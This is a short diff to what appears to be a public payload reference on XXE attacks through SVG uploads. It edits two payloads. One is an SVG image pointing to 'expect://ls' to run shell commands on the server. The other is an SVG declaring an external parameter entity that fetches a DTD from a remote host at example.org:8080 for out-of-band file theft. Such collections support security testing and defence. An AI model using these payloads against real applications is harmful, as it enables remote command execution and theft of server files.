@@ -419,7 +419,7 @@ From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
-    <image xlink:href="expect://ls"></image>
+    <image xlink:href="expect://ls" width="200" height="200"></image>
 </svg>
 ```
 
@@ -438,6 +438,7 @@ From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
 *xxe.svg*
 
 ```xml
+<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
 <!ELEMENT svg ANY >
 <!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
